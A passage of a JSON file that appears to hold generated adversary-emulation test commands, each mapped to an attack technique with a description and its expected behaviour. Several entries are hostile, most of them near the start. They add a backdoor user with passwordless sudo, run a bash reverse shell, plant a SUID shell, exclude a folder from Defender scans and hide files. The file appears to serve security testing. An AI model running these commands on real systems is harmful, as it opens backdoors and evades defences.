      "technique_id": "9c163b8b-a435-4b6a-a7e4-525826c6fe85",
      "technique_name": "Command and Scripting Interpreter",
      "tactic": "Execution",
      "platform": "linux",
      "command": "sudo useradd -m -p $(openssl passwd -1 testpass) attacker && echo 'attacker ALL=(ALL) NOPASSWD:ALL' >> /etc/sudoers",
      "description": "Creates a new user 'attacker' with a hashed password and grants sudo privileges without password prompt.",
      "requires_admin": true,
      "safety_level": "high",
      "expected_behavior": "A new user 'attacker' is created with home directory and added to sudoers with full privileges. This simulates an attacker creating a backdoor account.",
      "source": "langchain",
      "generated_at": "2025-12-28T12:40:56.021403",
      "agent_id": "ad1f738e-0505-48d0-9301-d8e6198f726f",
      "confidence_score": 0.761,
      "validated": true
    },
    {
      "id": "38ba83b4-ad38-4ced-966d-70fa65a0b903",
      "ttp_id": "9c163b8b-a435-4b6a-a7e4-525826c6fe85",
      "technique_id": "9c163b8b-a435-4b6a-a7e4-525826c6fe85",
      "technique_name": "Command and Scripting Interpreter",
      "tactic": "Execution",
      "platform": "linux",
      "command": "echo 'bash -i >& /dev/tcp/127.0.0.1/4444 0>&1' > $HOME/.ssh/backup.sh && chmod +x $HOME/.ssh/backup.sh && sudo $HOME/.ssh/backup.sh",
      "description": "Writes a reverse shell script to a hidden file, makes it executable, and runs it with elevated privileges to simulate backdoor execution.",
      "requires_admin": true,
      "safety_level": "high",
      "expected_behavior": "A reverse shell script is created and executed. It attempts to connect back to 127.0.0.1:4444. In a real attack, this would give remote access. Here, it fails safely due to no listener.",
      "source": "langchain",
      "generated_at": "2025-12-28T12:40:56.021403",
      "agent_id": "ad1f738e-0505-48d0-9301-d8e6198f726f",
      "confidence_score": 0.761,
      "validated": true
    },
    {
      "id": "c8f35146-10cc-4b80-9ab0-011fb07e0274",
      "ttp_id": "9c163b8b-a435-4b6a-a7e4-525826c6fe85",
      "technique_id": "9c163b8b-a435-4b6a-a7e4-525826c6fe85",
      "technique_name": "Command and Scripting Interpreter",
      "tactic": "Execution",
      "platform": "linux",
      "command": "sudo /bin/sh -c 'cp /bin/bash /tmp/.shell && chmod +s /tmp/.shell' && /tmp/.shell -p",
      "description": "Copies /bin/bash to /tmp/.shell and sets the SUID bit, then executes it to gain a shell with elevated privileges.",
      "requires_admin": true,
      "safety_level": "high",
      "expected_behavior": "A SUID shell binary is created in /tmp and executed. The '-p' flag preserves privileges, potentially allowing privilege escalation. This simulates persistence via SUID backdoor.",
      "source": "langchain",
      "generated_at": "2025-12-28T12:40:56.021403",
      "agent_id": "ad1f738e-0505-48d0-9301-d8e6198f726f",
      "confidence_score": 0.761,
      "validated": true
    },
    {
      "id": "1a779072-dddc-4842-a146-0fdb156ba767",
      "ttp_id": "e1f2b89f-979a-419e-a5b6-cb474a2347b9",
      "technique_id": "e1f2b89f-979a-419e-a5b6-cb474a2347b9",
      "technique_name": "Rootkit",
      "tactic": "Defense Evasion",
      "platform": "windows",
      "command": "cmd.exe /c echo \"This is a benign rootkit test\" > %TEMP%\\rootkit_test.txt",
      "description": "Basic example of creating a file that could be used by a rootkit to store information, using a benign string.",
      "requires_admin": false,
      "safety_level": "low",
      "expected_behavior": "A file named rootkit_test.txt will be created in the temp directory with the specified contents.",
      "source": "langchain",
      "generated_at": "2025-12-28T12:34:38.814507",
      "agent_id": "ad1f738e-0505-48d0-9301-d8e6198f726f",
      "confidence_score": 0.732,
      "validated": true
    },
    {
      "id": "0c908135-398e-4317-a597-785d66dfa435",
      "ttp_id": "e1f2b89f-979a-419e-a5b6-cb474a2347b9",
      "technique_id": "e1f2b89f-979a-419e-a5b6-cb474a2347b9",
      "technique_name": "Rootkit",
      "tactic": "Defense Evasion",
      "platform": "windows",
      "command": "powershell -Command \"Add-MpPreference -ExclusionPath '%TEMP%'\"",
      "description": "Intermediate example of excluding a directory from Windows Defender scans, which could be used by a rootkit to evade detection.",
      "requires_admin": true,
      "safety_level": "medium",
      "expected_behavior": "The temp directory will be excluded from Windows Defender scans.",
      "source": "langchain",
      "generated_at": "2025-12-28T12:34:38.814507",
      "agent_id": "ad1f738e-0505-48d0-9301-d8e6198f726f",
      "confidence_score": 0.732,
      "validated": true
    },
    {
      "id": "7a0005c0-d700-4a9f-874a-c6bd4294f61a",
      "ttp_id": "e1f2b89f-979a-419e-a5b6-cb474a2347b9",
      "technique_id": "e1f2b89f-979a-419e-a5b6-cb474a2347b9",
      "technique_name": "Rootkit",
      "tactic": "Defense Evasion",
      "platform": "windows",
      "command": "cmd.exe /c net start | findstr /i \"rootkit\"",
      "description": "Advanced example of searching for a rootkit process, using a benign string for the process name.",
      "requires_admin": false,
      "safety_level": "low",
      "expected_behavior": "The command will list running services and filter the output to show any service containing the string 'rootkit'.",
      "source": "langchain",
      "generated_at": "2025-12-28T12:34:38.814507",
      "agent_id": "ad1f738e-0505-48d0-9301-d8e6198f726f",
      "confidence_score": 0.732,
      "validated": true
    },
    {
      "id": "354df4fa-f721-48ef-9599-93632b72cd9d",
      "ttp_id": "e1f2b89f-979a-419e-a5b6-cb474a2347b9",
      "technique_id": "e1f2b89f-979a-419e-a5b6-cb474a2347b9",
      "technique_name": "Rootkit",
      "tactic": "Defense Evasion",
      "platform": "linux",
      "command": "echo 'Malicious content' > /tmp/malicious_file; mv /tmp/malicious_file /tmp/legitimate_name",
      "description": "Creates a file with potentially malicious content in /tmp, then renames it to blend in with legitimate system files.",
      "requires_admin": false,
      "safety_level": "low",
      "expected_behavior": "A file named 'legitimate_name' will be created in /tmp containing 'Malicious content', simulating how a rootkit might hide malicious files.",
      "source": "langchain",
      "generated_at": "2025-12-28T12:34:39.588605",
      "agent_id": "ad1f738e-0505-48d0-9301-d8e6198f726f",
      "confidence_score": 0.732,
      "validated": true
    },
    {
      "id": "b3893eb7-370c-4f5f-80fc-f106d349fac2",
      "ttp_id": "e1f2b89f-979a-419e-a5b6-cb474a2347b9",
      "technique_id": "e1f2b89f-979a-419e-a5b6-cb474a2347b9",
      "technique_name": "Rootkit",
      "tactic": "Defense Evasion",
      "platform": "linux",
      "command": "chmod 000 /tmp/legitimate_name",
      "description": "Changes the permissions of the 'legitimate_name' file to prevent it from being easily detected or accessed.",
      "requires_admin": false,
      "safety_level": "low",
      "expected_behavior": "The 'legitimate_name' file will have its permissions changed to prevent reading, writing, or execution, simulating a rootkit hiding its tracks.",
      "source": "langchain",
      "generated_at": "2025-12-28T12:34:39.588605",
      "agent_id": "ad1f738e-0505-48d0-9301-d8e6198f726f",
      "confidence_score": 0.732,
      "validated": true
    },
    {
      "id": "6cbd8ab3-57f5-4b5a-8baf-49998357af99",
      "ttp_id": "e1f2b89f-979a-419e-a5b6-cb474a2347b9",
      "technique_id": "e1f2b89f-979a-419e-a5b6-cb474a2347b9",
      "technique_name": "Rootkit",
      "tactic": "Defense Evasion",
      "platform": "linux",
      "command": "mv /tmp/legitimate_name /tmp/.hidden_file",
      "description": "Moves the file to a hidden location by prefixing its name with a dot, a common method to hide files in Linux.",
      "requires_admin": false,
      "safety_level": "low",
      "expected_behavior": "The file will be moved and renamed to '.hidden_file', making it less visible when listing files in /tmp, simulating another rootkit evasion technique.",
      "source": "langchain",
      "generated_at": "2025-12-28T12:34:39.588605",
      "agent_id": "ad1f738e-0505-48d0-9301-d8e6198f726f",
      "confidence_score": 0.732,
      "validated": true
    },
    {
      "id": "d213e3c2-810a-4589-ac43-484dd5ef37c1",
      "ttp_id": "d5336172-e781-447a-887e-8875176acbeb",
      "technique_id": "d5336172-e781-447a-887e-8875176acbeb",
      "technique_name": "PowerShell",
      "tactic": "Execution",
      "platform": "windows",
      "command": "powershell -Command \"Get-Date\"",
      "description": "Basic command to get the current date using PowerShell",
      "requires_admin": false,
      "safety_level": "low",
      "expected_behavior": "Displays the current date and time",
      "source": "langchain",
      "generated_at": "2025-12-28T12:34:38.173498",
      "agent_id": "ad1f738e-0505-48d0-9301-d8e6198f726f",
      "confidence_score": 0.727,
      "validated": true
    },
    {
      "id": "4ce5dc7e-4aee-45bb-9fc9-958a9e090787",
      "ttp_id": "d5336172-e781-447a-887e-8875176acbeb",
      "technique_id": "d5336172-e781-447a-887e-8875176acbeb",
      "technique_name": "PowerShell",
      "tactic": "Execution",
      "platform": "windows",
      "command": "powershell -Command \"mkdir '$env:TEMP\\TestDir' -ErrorAction SilentlyContinue; cd '$env:TEMP\\TestDir'; echo 'Hello World' > test.txt\"",
      "description": "Intermediate command that creates a directory, navigates into it, and creates a file using PowerShell",
      "requires_admin": false,
      "safety_level": "medium",
      "expected_behavior": "Creates a new directory in the temp folder, navigates into it, and creates a file named test.txt with the content 'Hello World'",
      "source": "langchain",
      "generated_at": "2025-12-28T12:34:38.173498",
      "agent_id": "ad1f738e-0505-48d0-9301-d8e6198f726f",
      "confidence_score": 0.727,
      "validated": true
    },
    {
      "id": "f650c758-fc72-4fb2-ab20-f99c83ea1ba3",
      "ttp_id": "d5336172-e781-447a-887e-8875176acbeb",
      "technique_id": "d5336172-e781-447a-887e-8875176acbeb",
      "technique_name": "PowerShell",
      "tactic": "Execution",
      "platform": "windows",
      "command": "powershell -Command \"&{echo 'Hello World'}\"",
      "description": "Advanced command using PowerShell's script block execution",
      "requires_admin": false,
      "safety_level": "low",
      "expected_behavior": "Executes a script block that prints 'Hello World' to the console",
      "source": "langchain",
      "generated_at": "2025-12-28T12:34:38.173498",
      "agent_id": "ad1f738e-0505-48d0-9301-d8e6198f726f",
      "confidence_score": 0.727,
      "validated": true
    },
    {
      "id": "1b725862-dc59-4cd7-9a0e-3443298196a9",
      "ttp_id": "d5336172-e781-447a-887e-8875176acbeb",
      "technique_id": "d5336172-e781-447a-887e-8875176acbeb",
      "technique_name": "PowerShell",
      "tactic": "Execution",
      "platform": "linux",
      "command": "pwsh -Command \"Get-Date > $env:TEMP/date.txt\"",
      "description": "Basic command to write the current date to a file in the temporary directory using PowerShell on Linux.",
      "requires_admin": false,
      "safety_level": "low",
      "expected_behavior": "Creates a file named date.txt in the temporary directory with the current date.",
      "source": "langchain",
      "generated_at": "2025-12-28T12:34:39.104012",
      "agent_id": "ad1f738e-0505-48d0-9301-d8e6198f726f",
      "confidence_score": 0.727,
      "validated": true
    },
    {
      "id": "6194433c-525e-41d7-bd4c-d7a91d087d01",
      "ttp_id": "d5336172-e781-447a-887e-8875176acbeb",
      "technique_id": "d5336172-e781-447a-887e-8875176acbeb",
      "technique_name": "PowerShell",
      "tactic": "Execution",
      "platform": "linux",
      "command": "pwsh -Command \"Compress-Archive -Path $env:TEMP/date.txt -DestinationPath $env:TEMP/archive.zip -Force\"",
      "description": "Intermediate command to compress a file using PowerShell on Linux, demonstrating file operation with -Force.",
      "requires_admin": false,
      "safety_level": "low",
      "expected_behavior": "Creates a zip archive in the temporary directory containing the date.txt file.",
      "source": "langchain",
      "generated_at": "2025-12-28T12:34:39.104012",
      "agent_id": "ad1f738e-0505-48d0-9301-d8e6198f726f",
      "confidence_score": 0.727,
      "validated": true
    },
    {
      "id": "33002667-5d5f-4459-805a-0f8973603eee",
      "ttp_id": "d5336172-e781-447a-887e-8875176acbeb",
      "technique_id": "d5336172-e781-447a-887e-8875176acbeb",
      "technique_name": "PowerShell",
      "tactic": "Execution",
      "platform": "linux",
      "command": "pwsh -Command \"Remove-Item $env:TEMP/date.txt -ErrorAction SilentlyContinue\"",
      "description": "Advanced command to remove a file using PowerShell on Linux, handling potential errors silently.",
      "requires_admin": false,
      "safety_level": "low",
      "expected_behavior": "Removes the date.txt file from the temporary directory, suppressing any error messages if the file does not exist.",
      "source": "langchain",
      "generated_at": "2025-12-28T12:34:39.104518",
      "agent_id": "ad1f738e-0505-48d0-9301-d8e6198f726f",
      "confidence_score": 0.727,
      "validated": true
    },
    {
      "id": "fcac4ff0-a933-4399-b71d-369cc9d66d09",
      "ttp_id": "95a12f52-5fda-4780-b1c4-ee73278a58c1",
      "technique_id": "95a12f52-5fda-4780-b1c4-ee73278a58c1",
      "technique_name": "Reflective Code Loading",
      "tactic": "Defense Evasion",
      "platform": "windows",
      "command": "powershell -Command \"[System.Reflection.Assembly]::Load([System.Convert]::FromBase64String('SGVsbG8gd29ybGQ='))\"",
      "description": "Basic reflective code loading using PowerShell to load an assembly from a base64 encoded string.",
      "requires_admin": false,
      "safety_level": "low",
      "expected_behavior": "Loads a simple 'Hello World' assembly into memory without writing it to disk.",
      "source": "langchain",
      "generated_at": "2025-12-28T12:34:39.792732",
      "agent_id": "ad1f738e-0505-48d0-9301-d8e6198f726f",
      "confidence_score": 0.725,
      "validated": true
    },
    {
      "id": "7615a9c6-3a95-41eb-a68d-170ae2fc7ed3",
      "ttp_id": "95a12f52-5fda-4780-b1c4-ee73278a58c1",
      "technique_id": "95a12f52-5fda-4780-b1c4-ee73278a58c1",
      "technique_name": "Reflective Code Loading",
      "tactic": "Defense Evasion",
      "platform": "windows",
      "command": "powershell -Command \"[System.Reflection.Assembly]::Load([System.Convert]::FromBase64String('SGVsbG8gd29ybGQh')) ; [System.Console]::WriteLine('Loaded reflectively')\"",
      "description": "Intermediate reflective code loading that not only loads an assembly but also executes a method from it, demonstrating more complex behavior.",
      "requires_admin": false,
      "safety_level": "medium",
      "expected_behavior": "Loads an assembly and then writes a message to the console, showing that the loaded code can be executed.",
      "source": "langchain",
      "generated_at": "2025-12-28T12:34:39.792732",
      "agent_id": "ad1f738e-0505-48d0-9301-d8e6198f726f",
      "confidence_score": 0.725,
      "validated": true
    },
    {
      "id": "a613f8e1-0a37-43b5-8501-65c096074c29",
      "ttp_id": "95a12f52-5fda-4780-b1c4-ee73278a58c1",
      "technique_id": "95a12f52-5fda-4780-b1c4-ee73278a58c1",
      "technique_name": "Reflective Code Loading",
      "tactic": "Defense Evasion",
      "platform": "windows",
      "command": "powershell -Command \"Add-Type -TypeDefinition 'using System; public class Reflective { public static void Main() { Console.WriteLine(\"Loaded reflectively\"); } }' ; [Reflective]::Main()\"",
      "description": "Advanced reflective code loading where a new type is defined in memory and then instantiated and executed, showcasing dynamic code loading and execution capabilities.",
      "requires_admin": false,
      "safety_level": "medium",
      "expected_behavior": "Defines a new .NET type in memory, instantiates it, and calls its Main method, demonstrating advanced reflective code loading and execution.",
      "source": "langchain",
      "generated_at": "2025-12-28T12:34:39.792732",
      "agent_id": "ad1f738e-0505-48d0-9301-d8e6198f726f",
      "confidence_score": 0.725,
      "validated": true
    },
    {
      "id": "a2dd153f-1bbc-4a4e-978d-a9e6acfed1b2",
      "ttp_id": "95a12f52-5fda-4780-b1c4-ee73278a58c1",
      "technique_id": "95a12f52-5fda-4780-b1c4-ee73278a58c1",
      "technique_name": "Reflective Code Loading",
      "tactic": "Defense Evasion",
      "platform": "linux",
      "command": "echo 'echo Hello World!' | bash",
      "description": "Basic demonstration of executing a command in memory using bash.",
      "requires_admin": false,
      "safety_level": "low",
      "expected_behavior": "Prints 'Hello World!' to the console, demonstrating execution of a command from a string in memory.",
      "source": "langchain",
      "generated_at": "2025-12-28T12:34:40.506432",
      "agent_id": "ad1f738e-0505-48d0-9301-d8e6198f726f",
      "confidence_score": 0.725,
      "validated": true
    },
    {
      "id": "2e4eb14d-74ae-4163-9a4a-966e4d3eee34",
      "ttp_id": "95a12f52-5fda-4780-b1c4-ee73278a58c1",
      "technique_id": "95a12f52-5fda-4780-b1c4-ee73278a58c1",
      "technique_name": "Reflective Code Loading",
      "tactic": "Defense Evasion",
      "platform": "linux",
      "command": "bash -c 'echo \"This is a reflective code loading demo\"'",
      "description": "Intermediate demonstration using bash -c to execute a command string, showcasing nested quoting for command execution.",
      "requires_admin": false,
      "safety_level": "low",
      "expected_behavior": "Prints 'This is a reflective code loading demo' to the console, demonstrating the use of bash -c for in-memory command execution with nested quotes.",
      "source": "langchain",
      "generated_at": "2025-12-28T12:34:40.506432",
      "agent_id": "ad1f738e-0505-48d0-9301-d8e6198f726f",
      "confidence_score": 0.725,
      "validated": true
    },
    {
      "id": "2ae99745-c1af-4608-b22c-7e838ed23808",
      "ttp_id": "95a12f52-5fda-4780-b1c4-ee73278a58c1",
      "technique_id": "95a12f52-5fda-4780-b1c4-ee73278a58c1",
      "technique_name": "Reflective Code Loading",
      "tactic": "Defense Evasion",
      "platform": "linux",
      "command": "bash -c \"echo 'Demonstrating advanced reflective code loading with nested commands' | bash\"",
      "description": "Advanced demonstration involving nested commands and pipes to simulate complex reflective code loading scenarios.",
      "requires_admin": false,
      "safety_level": "medium",
      "expected_behavior": "Prints 'Demonstrating advanced reflective code loading with nested commands' to the console, showing the execution of nested commands and pipes for reflective code loading.",
      "source": "langchain",
      "generated_at": "2025-12-28T12:34:40.506944",
      "agent_id": "ad1f738e-0505-48d0-9301-d8e6198f726f",
      "confidence_score": 0.725,
      "validated": true
    },
    {
      "id": "03638d74-b8ed-4f33-a4e9-cd7e0c39f9fc",
      "ttp_id": "3c481214-09a8-47a9-8954-c13b5c362e6f",
      "technique_id": "3c481214-09a8-47a9-8954-c13b5c362e6f",
      "technique_name": "Screen Capture",
      "tactic": "Collection",
      "platform": "linux",
      "command": "import -window root $HOME/.cache/screen_capture.png",
      "description": "Basic screen capture using ImageMagick 'import' to capture the entire desktop and save as PNG.",
      "requires_admin": false,
      "safety_level": "low",
      "expected_behavior": "Captures the full screen and saves it as screen_capture.png in the user's cache directory.",
      "source": "langchain",
      "generated_at": "2025-12-28T12:53:33.531582",
      "agent_id": "ad1f738e-0505-48d0-9301-d8e6198f726f",
      "confidence_score": 0.721,
      "validated": true
    },
    {
      "id": "5e510fcb-87fd-44d1-8cb1-49d95d60e63a",
      "ttp_id": "3c481214-09a8-47a9-8954-c13b5c362e6f",
      "technique_id": "3c481214-09a8-47a9-8954-c13b5c362e6f",
      "technique_name": "Screen Capture",
      "tactic": "Collection",
      "platform": "linux",
      "command": "gnome-screenshot -f $TMP/scrshot.png",
      "description": "Intermediate screen capture using gnome-screenshot to save the desktop image to a temporary file.",
      "requires_admin": false,
      "safety_level": "low",
      "expected_behavior": "Takes a screenshot of the current desktop and stores it in /tmp/scrshot.png.",
      "source": "langchain",
      "generated_at": "2025-12-28T12:53:33.531582",
      "agent_id": "ad1f738e-0505-48d0-9301-d8e6198f726f",
      "confidence_score": 0.721,
      "validated": true
    },
    {
      "id": "1edeb13d-50a3-4a28-910f-6f1d9759e2eb",
      "ttp_id": "3c481214-09a8-47a9-8954-c13b5c362e6f",
      "technique_id": "3c481214-09a8-47a9-8954-c13b5c362e6f",
      "technique_name": "Screen Capture",
      "tactic": "Collection",
      "platform": "linux",
      "command": "ffmpeg -f x11grab -video_size 1280x800 -i $DISPLAY -t 10 -vcodec libx264 $HOME/.cache/capture.mp4 -y 2>/dev/null",
      "description": "Advanced screen capture: records a 10-second video of the desktop using ffmpeg and saves as MP4.",
      "requires_admin": false,
      "safety_level": "low",
      "expected_behavior": "Records 10 seconds of screen activity and saves the output as capture.mp4 in the user's cache directory; suppresses error output.",
      "source": "langchain",
      "generated_at": "2025-12-28T12:53:33.531582",
      "agent_id": "ad1f738e-0505-48d0-9301-d8e6198f726f",
      "confidence_score": 0.721,
      "validated": true
    },
    {
      "id": "d7356704-110b-4b23-98b9-2437a9cf1942",
      "ttp_id": "ea74cef6-b196-4809-a102-6c210d027ae6",
      "technique_id": "ea74cef6-b196-4809-a102-6c210d027ae6",
      "technique_name": "File and Directory Discovery",
      "tactic": "Discovery",
      "platform": "windows",
      "command": "dir \"%SystemRoot%\\System32\" /a",
      "description": "Lists all files and directories in System32 using legacy dir command to discover system binaries and configurations.",
      "requires_admin": false,
      "safety_level": "low",
      "expected_behavior": "Outputs a directory listing of C:\\Windows\\System32, showing files and subdirectories with attributes (hidden, system, etc.). No changes are made to the system.",
      "source": "langchain",
      "generated_at": "2025-12-28T12:38:47.275368",
      "agent_id": "ad1f738e-0505-48d0-9301-d8e6198f726f",
      "confidence_score": 0.713,
      "validated": true
    },
    {
      "id": "55096b40-60e2-48d7-84a5-000cd87aa955",
      "ttp_id": "ea74cef6-b196-4809-a102-6c210d027ae6",
      "technique_id": "ea74cef6-b196-4809-a102-6c210d027ae6",
      "technique_name": "File and Directory Discovery",
      "tactic": "Discovery",
      "platform": "windows",
      "command": "powershell -Command \"Get-ChildItem -Path $env:TEMP -Attributes !Directory | Select-Object Name, Length, LastWriteTime\"",
      "description": "Uses PowerShell to list non-directory items in the user's temp folder with size and timestamp for discovery purposes.",
      "requires_admin": false,
      "safety_level": "low",
      "expected_behavior": "Displays a list of files in the temporary directory including name, size, and modification time. No system changes occur.",
      "source": "langchain",
      "generated_at": "2025-12-28T12:38:47.275873",
      "agent_id": "ad1f738e-0505-48d0-9301-d8e6198f726f",
      "confidence_score": 0.713,
      "validated": true
    },
    {
      "id": "5cb9a19b-2449-4c5c-a7e5-6e75daa19136",
      "ttp_id": "ea74cef6-b196-4809-a102-6c210d027ae6",
      "technique_id": "ea74cef6-b196-4809-a102-6c210d027ae6",
      "technique_name": "File and Directory Discovery",
      "tactic": "Discovery",
      "platform": "windows",
      "command": "cmd.exe /c \"echo. > \"%TEMP%\\test_discovery.txt\" && dir \"%TEMP%\" | findstr /i \"test_discovery\" && del \"%TEMP%\\test_discovery.txt\"\"",
      "description": "Creates a test file in TEMP, lists directory contents to confirm presence, then deletes it\u2014simulating file discovery activity with cleanup.",
      "requires_admin": false,
      "safety_level": "medium",
      "expected_behavior": "A temporary file is created, detected via dir output filtered with findstr, and then removed. Minimal footprint with no persistent changes.",
      "source": "langchain",
      "generated_at": "2025-12-28T12:38:47.275873",
      "agent_id": "ad1f738e-0505-48d0-9301-d8e6198f726f",
      "confidence_score": 0.713,
      "validated": true
    },
    {
      "id": "0a4e7d0d-980f-4201-9630-0d82c98cf7f7",
      "ttp_id": "ea74cef6-b196-4809-a102-6c210d027ae6",
      "technique_id": "ea74cef6-b196-4809-a102-6c210d027ae6",
      "technique_name": "File and Directory Discovery",
      "tactic": "Discovery",
      "platform": "linux",
      "command": "ls -la /home",
      "description": "Lists all files and directories in /home with detailed attributes (permissions, owner, size, timestamps).",
      "requires_admin": false,
      "safety_level": "low",
      "expected_behavior": "Outputs a detailed list of user directories and files in /home. No changes to the system occur.",
      "source": "langchain",
      "generated_at": "2025-12-28T12:40:56.020391",
      "agent_id": "ad1f738e-0505-48d0-9301-d8e6198f726f",
      "confidence_score": 0.713,
      "validated": true
    },
    {
      "id": "fca156ac-9a52-4a22-9315-18befa61a4b6",
      "ttp_id": "ea74cef6-b196-4809-a102-6c210d027ae6",
      "technique_id": "ea74cef6-b196-4809-a102-6c210d027ae6",
      "technique_name": "File and Directory Discovery",
      "tactic": "Discovery",
      "platform": "linux",
      "command": "find /home -type f -name '*.conf' -o -name '*.log' 2>/dev/null",
      "description": "Searches for configuration and log files in /home directories to identify potentially sensitive files.",
      "requires_admin": false,
      "safety_level": "low",
      "expected_behavior": "Prints paths of files ending in .conf or .log within /home. Errors from permission-denied are suppressed.",
      "source": "langchain",
      "generated_at": "2025-12-28T12:40:56.020391",
      "agent_id": "ad1f738e-0505-48d0-9301-d8e6198f726f",
      "confidence_score": 0.713,
      "validated": true
    },
    {
      "id": "70157bbf-a07c-4522-a156-fcba21299a74",
      "ttp_id": "ea74cef6-b196-4809-a102-6c210d027ae6",
      "technique_id": "ea74cef6-b196-4809-a102-6c210d027ae6",
      "technique_name": "File and Directory Discovery",
      "tactic": "Discovery",
      "platform": "linux",
      "command": "stat /etc/passwd /etc/shadow 2>/dev/null",
      "description": "Retrieves detailed metadata (size, permissions, timestamps) for critical system files.",
      "requires_admin": true,
      "safety_level": "medium",
      "expected_behavior": "Displays file attributes for /etc/passwd and /etc/shadow if accessible. /etc/shadow typically requires root. Errors are suppressed.",
      "source": "langchain",
      "generated_at": "2025-12-28T12:40:56.020391",
      "agent_id": "ad1f738e-0505-48d0-9301-d8e6198f726f",
      "confidence_score": 0.713,
      "validated": true
    },
    {
      "id": "ebfc5a56-8b78-4d99-b34d-c117bb2bf854",
      "ttp_id": "7b195abb-3c8d-4561-a756-28bc11049657",
      "technique_id": "7b195abb-3c8d-4561-a756-28bc11049657",
      "technique_name": "Obfuscated Files or Information: Software Packing",
      "tactic": "Defense Evasion",
      "platform": "windows",
      "command": "compress-archive -path %TEMP%\\test.txt -destinationPath %TEMP%\\packed.zip",
      "description": "Create a packed archive of a benign file using the built-in compressor.",
      "requires_admin": false,
      "safety_level": "low",
      "expected_behavior": "A packed zip archive will be created in the temp directory.",
      "source": "langchain",
      "generated_at": "2025-12-28T12:34:38.196465",
      "agent_id": "ad1f738e-0505-48d0-9301-d8e6198f726f",
      "confidence_score": 0.709,
      "validated": true
    },
    {
      "id": "bbdb0065-e9c7-4da3-b6a1-ead018482527",
      "ttp_id": "7b195abb-3c8d-4561-a756-28bc11049657",
      "technique_id": "7b195abb-3c8d-4561-a756-28bc11049657",
      "technique_name": "Obfuscated Files or Information: Software Packing",
      "tactic": "Defense Evasion",
      "platform": "windows",
      "command": "powershell -Command \"[System.Text.Encoding]::UTF8.GetString([System.Convert]::FromBase64String('SGVsbG8gd29ybGQ=')) | Out-File -FilePath %TEMP%\\test.txt\"",
      "description": "Use PowerShell to decode a Base64 encoded string and write it to a file, simulating the obfuscation of malware.",
      "requires_admin": false,
      "safety_level": "low",
      "expected_behavior": "A file named test.txt will be created in the temp directory with the decoded string.",
      "source": "langchain",
      "generated_at": "2025-12-28T12:34:38.196465",
      "agent_id": "ad1f738e-0505-48d0-9301-d8e6198f726f",
      "confidence_score": 0.709,
      "validated": true
    },
    {
      "id": "fc45aa2e-b2aa-49be-8bdb-9c31f9937beb",
      "ttp_id": "7b195abb-3c8d-4561-a756-28bc11049657",
      "technique_id": "7b195abb-3c8d-4561-a756-28bc11049657",
      "technique_name": "Obfuscated Files or Information: Software Packing",
      "tactic": "Defense Evasion",
      "platform": "windows",
      "command": "certutil -encode %TEMP%\\test.txt %TEMP%\\encoded.txt",
      "description": "Use the certutil tool to encode a file, further demonstrating the Software Packing technique.",
      "requires_admin": false,
      "safety_level": "low",
      "expected_behavior": "An encoded version of the test.txt file will be created in the temp directory.",
      "source": "langchain",
      "generated_at": "2025-12-28T12:34:38.196465",
      "agent_id": "ad1f738e-0505-48d0-9301-d8e6198f726f",
      "confidence_score": 0.709,
      "validated": true
    },
    {
      "id": "57f43099-aa1d-4f5f-ae2c-292655d17e17",
      "ttp_id": "7b195abb-3c8d-4561-a756-28bc11049657",
      "technique_id": "7b195abb-3c8d-4561-a756-28bc11049657",
      "technique_name": "Obfuscated Files or Information: Software Packing",
      "tactic": "Defense Evasion",
      "platform": "linux",
      "command": "echo 'Test file content' > test.txt; tar -czf packed_file.tar.gz test.txt",
      "description": "Basic command to create a packed file using tar",
      "requires_admin": false,
      "safety_level": "low",
      "expected_behavior": "Creates a packed file named packed_file.tar.gz in the current directory",
      "source": "langchain",
      "generated_at": "2025-12-28T12:34:39.215579",
      "agent_id": "ad1f738e-0505-48d0-9301-d8e6198f726f",
      "confidence_score": 0.709,
      "validated": true
    },
    {
      "id": "8686bc1a-e8dd-4e74-b7ea-993e2bae424c",
      "ttp_id": "7b195abb-3c8d-4561-a756-28bc11049657",
      "technique_id": "7b195abb-3c8d-4561-a756-28bc11049657",
      "technique_name": "Obfuscated Files or Information: Software Packing",
      "tactic": "Defense Evasion",
      "platform": "linux",
      "command": "echo 'Test file content' > test.txt; zip packed_file.zip test.txt",
      "description": "Intermediate command to create a packed file using zip",
      "requires_admin": false,
      "safety_level": "low",
      "expected_behavior": "Creates a packed file named packed_file.zip in the current directory",
      "source": "langchain",
      "generated_at": "2025-12-28T12:34:39.215579",
      "agent_id": "ad1f738e-0505-48d0-9301-d8e6198f726f",
      "confidence_score": 0.709,
      "validated": true
    },
    {
      "id": "e0467589-73ae-44c6-a47c-b8c577146199",
      "ttp_id": "7b195abb-3c8d-4561-a756-28bc11049657",
      "technique_id": "7b195abb-3c8d-4561-a756-28bc11049657",
      "technique_name": "Obfuscated Files or Information: Software Packing",
      "tactic": "Defense Evasion",
      "platform": "linux",
      "command": "echo 'Test file content' > test.txt; rar a packed_file.rar test.txt",
      "description": "Advanced command to create a packed file using rar",
      "requires_admin": false,
      "safety_level": "low",
      "expected_behavior": "Creates a packed file named packed_file.rar in the current directory",
      "source": "langchain",
      "generated_at": "2025-12-28T12:34:39.215579",
      "agent_id": "ad1f738e-0505-48d0-9301-d8e6198f726f",
      "confidence_score": 0.709,
      "validated": true
    },
    {
      "id": "cf6406f3-9276-418f-a5b1-f89978ea6d8b",
      "ttp_id": "632e57be-75cc-4478-8d50-2ce60af956b8",
      "technique_id": "632e57be-75cc-4478-8d50-2ce60af956b8",
      "technique_name": "Gather Victim Host Information",
      "tactic": "Discovery",
      "platform": "linux",
      "command": "whoami",
      "description": "Display the current user context to identify privilege level and potential scope of access.",
      "requires_admin": false,
      "safety_level": "low",
      "expected_behavior": "Outputs the username associated with the current session.",
      "source": "langchain",
      "generated_at": "2025-12-28T12:51:10.794587",
      "agent_id": "ad1f738e-0505-48d0-9301-d8e6198f726f",
      "confidence_score": 0.709,
      "validated": true
    },
    {
      "id": "a9388b39-a003-4f46-a202-2655aa422a6a",
      "ttp_id": "632e57be-75cc-4478-8d50-2ce60af956b8",
      "technique_id": "632e57be-75cc-4478-8d50-2ce60af956b8",
      "technique_name": "Gather Victim Host Information",
      "tactic": "Discovery",
      "platform": "linux",
      "command": "ip addr show",
      "description": "List all network interfaces and their IP addresses, including IPv4 and IPv6 configurations.",
      "requires_admin": false,
      "safety_level": "low",
      "expected_behavior": "Displays detailed network interface information such as interface names, MAC addresses, and assigned IP addresses.",
      "source": "langchain",
      "generated_at": "2025-12-28T12:51:10.794587",
      "agent_id": "ad1f738e-0505-48d0-9301-d8e6198f726f",
      "confidence_score": 0.709,
      "validated": true
    },
    {
